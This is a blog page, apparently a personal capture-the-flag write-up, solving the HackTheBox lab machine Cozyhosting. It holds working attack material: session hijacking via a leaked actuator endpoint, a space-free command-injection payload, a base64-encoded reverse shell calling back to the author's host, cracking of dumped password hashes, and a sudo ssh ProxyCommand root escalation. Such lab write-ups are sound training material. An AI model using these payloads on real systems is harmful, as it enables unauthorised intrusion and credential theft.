@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta
+    name="description"
+    content=""
+  />
+  
+    
+      <title>Cozyhosting | Mrd0zz</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+    <div id="brand">
+      <a class="icon-link" href="//localhost:1313/">
+        <img
+          class="icon"
+          src="/images/home_img.jpg"
+        />
+      </a>
+      <div class="text">
+        <a href="//localhost:1313/"><h1>Mrd0zz</h1></a>
+        <h3></h3>
+      </div>
+    </div>
+    <nav>
+      
+        
+          
+          <a href="/"><b>Home</b></a>
+        
+           | 
+          <a href="/about/"><b>About</b></a>
+        
+           | 
+          <a href="/posts/"><b>Posts</b></a>
+        
+           | 
+          <a href="/categories/"><b>Categories</b></a>
+        
+           | 
+          <a href="/tags/"><b>Tags</b></a>
+        
+      
+    </nav>
+    <hr />
+  </header>
+  
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">Cozyhosting</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2023-10-10</time>
+    <span>in</span>
+    
+      <a href="/categories/htb-easy">htb-easy</a>
+  </strong>
+  <span> • 630 words</span>
+  <span> • 3 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/command-injection">Command Injection</a>, 
+        <a href="/tags/postgresql">Postgresql</a>, 
+        <a href="/tags/jtr">JTR</a>
+    </div>
+  
+</div>
+
+      <div class="content"><p>Cozyhosting is an easy machine from hackthebox which involved injection a session cookie redirecting to admin page. PLaying with the username field, got an error disclosing ssh command usage in the backend. After trying various bypassing methods sent the command without spaces and got back a shell as app user. Found credentials of postgres user in a jar file and dumped the hashes from the database. Cracked them using jtr and got access to josh user. Further enumerating, ssh can be run by josh user with root permissions.</p>
+<h2 id="nmap-tcp-scan">NMAP TCP SCAN</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># nmap -sC -sV -p- -vv --reason --min-rate=1000 -T4 10.10.11.230 -oN nmap_tcp_scan</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON  VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD OPTIONS
+</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
+</span></span><span style="display:flex;"><span>|_http-title: Cozy Hosting - Home
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h2 id="port-80">Port 80</h2>
+<ul>
+<li>Surfing the website we got a cookie named JSESSIONID</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirb/common.txt</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/admin                <span style="color:#f92672">(</span>Status: 401<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 97<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/error                <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 73<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 12706<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/login                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4431<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/logout               <span style="color:#f92672">(</span>Status: 204<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/wfuzz/general/megabeast.txt -t 30</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/actuator             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 634<span style="color:#f92672">]</span>
+</span></span></code></pre></div><ul>
+<li>
+<p>Going to the <code>actuator</code> page</p>
+</li>
+<li>
+<p>Going to <strong>/sessions</strong> directory got two session cookie</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;2F3333AC963252641A3BD937836A555A&#34;</span>:<span style="color:#e6db74">&#34;kanderson&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;2399F09710F0FCD106D670E1B184FAF0&#34;</span>:<span style="color:#e6db74">&#34;UNAUTHORIZED&#34;</span> <span style="color:#f92672">}</span>
+</span></span></code></pre></div><ul>
+<li>
+<p>Intercepting the <strong>/login</strong> endpoint request in burpsuite and sending the above cookie value in place of <code>JSESSIONID</code> and we get redirected to a <strong>/admin</strong> page</p>
+</li>
+<li>
+<p>Below on that page we have connection settings (<em>hostname and username</em>)</p>
+</li>
+<li>
+<p>Intercepting the request in burpsuite and submitting <em>username</em> field as empty we get an error:</p>
+<p><code>usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file</code></p>
+</li>
+<li>
+<p>It means on the backend it is attempting a SSH connection.</p>
+</li>
+<li>
+<p>After trying some command injections, concluded that we cannot use spaces in the username field</p>
+</li>
+<li>
+<p>Google searched and got : <a href="https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces">https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces</a></p>
+</li>
+<li>
+<p>Again tried with sending username (<em>URL encoded</em>) as <code>;whoami${IFS%??};</code> but didn’t got any output</p>
+</li>
+<li>
+<p>So tried <code>;ping${IFS%??}-c${IFS%??}2${IFS%??}10.10.14.81${IFS%??};</code> (<em>URL encoded</em>) and on my machine <code>sudo tcpdump -i tun0 icmp</code> and got connection back</p>
+</li>
+<li>
+<p>So we can try to run a reverse shell (<em>URL encoded</em>): <code>echo${IFS%??}&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44MS84ODg4IDA+JjEK&quot;${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash</code> and got a shell back</p>
+</li>
+</ul>
+<h2 id="enum-as-app-user">Enum as app user</h2>
+<ul>
+<li>
+<p>Spawned fully interactive TTY Shell</p>
+</li>
+<li>
+<p>Found a file <code>cloudhosting-0.0.1.jar</code> in the <strong>/app</strong> directory and transferred it into my machine</p>
+</li>
+<li>
+<p>Searched for passwords after unjar the file: <code>unjar xvf cloudhosting-0.0.1.jar</code> , <code>grep -iR 'password' .</code> and got a file with credentials: <code>BOOT-INF/classes/application.properties</code></p>
+</li>
+<li>
+<p>Got credentials of <strong>postgres</strong> user: <strong>Vg&amp;nvzAQ7XxR</strong></p>
+</li>
+<li>
+<p>Using these credentials connected to postgress database: <code>psql -h 127.0.0.1 -U postgres</code></p>
+</li>
+<li>
+<p>Connected to <strong>cozyhosting</strong> database and got creds</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cozyhosting<span style="color:#f92672">=</span><span style="color:#75715e"># \c cozyhosting</span>
+</span></span><span style="display:flex;"><span>SSL connection <span style="color:#f92672">(</span>protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>You are now connected to database <span style="color:#e6db74">&#34;cozyhosting&#34;</span> as user <span style="color:#e6db74">&#34;postgres&#34;</span>.
+</span></span><span style="display:flex;"><span>cozyhosting<span style="color:#f92672">=</span><span style="color:#75715e"># \d</span>
+</span></span><span style="display:flex;"><span>              List of relations
+</span></span><span style="display:flex;"><span> Schema |     Name     |   Type   |  Owner
+</span></span><span style="display:flex;"><span>--------+--------------+----------+----------
+</span></span><span style="display:flex;"><span> public | hosts        | table    | postgres
+</span></span><span style="display:flex;"><span> public | hosts_id_seq | sequence | postgres
+</span></span><span style="display:flex;"><span> public | users        | table    | postgres
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span><span style="color:#ae81ff">3</span> rows<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cozyhosting<span style="color:#f92672">=</span><span style="color:#75715e"># select * from users;</span>
+</span></span><span style="display:flex;"><span>   name    |                           password                           | role
+</span></span><span style="display:flex;"><span>-----------+--------------------------------------------------------------+-------
+</span></span><span style="display:flex;"><span> kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+</span></span><span style="display:flex;"><span> admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+</span></span></code></pre></div><ul>
+<li>
+<p>Copied the hashes into a file and cracked them using <em>JTR:</em> <code>john hashes --wordlist=/usr/share/wordlists/rockyou.txt</code></p>
+</li>
+<li>
+<p>We got a password <strong>manchesterunited</strong></p>
+</li>
+<li>
+<p>Tried this password on <em>josh</em> and we get successfully logged in.</p>
+</li>
+</ul>
+<h2 id="enum-as-josh-user">Enum as josh user</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>josh@cozyhosting:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> josh:
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> josh on localhost:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User josh may run the following commands on localhost:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> /usr/bin/ssh *
+</span></span></code></pre></div><ul>
+<li>Went to gtfobins and got the shell as root</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>josh@cozyhosting:~$ sudo ssh -o ProxyCommand<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;;bash 0&lt;&amp;2 1&gt;&amp;2&#39;</span> x
+</span></span><span style="display:flex;"><span>root@cozyhosting:/home/josh# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div></div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+    <hr />
+    
+      <p id="social">
+        Find me around the web:
+        <br />
+        
+          
+          <a href="https://github.com/Mrd0zz">GitHub</a>
+        
+           | 
+          <a href="https://www.linkedin.com/in/rohans21/">Linkedin</a>
+        
+           | 
+          <a href="https://twitter.com/Mrd0zz">Twitter</a>
+        
+           | 
+          <a href="https://www.reddit.com/user/Mrd0zz/">Reddit</a>
+        
+           | 
+          <a href="https://tryhackme.com/p/r0h4n">Tryhackme</a>
+        
+           | 
+          <a href="https://app.hackthebox.com/profile/1670697">Hackthebox</a>
+        
+      </p>
+    
+    <p class="copyright">
+      Copyright © 2024
+      
+      <strong>Rohan Sharma</strong>
+      
+    </p>
+    <p class="builtWith">
+      Built with
+      <a href="http://www.gohugo.io/">Hugo</a>,
+      using the theme
+      <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>
+      
+    </p>
+  </footer>
+  
+    </div>
+  </body>
+</html>
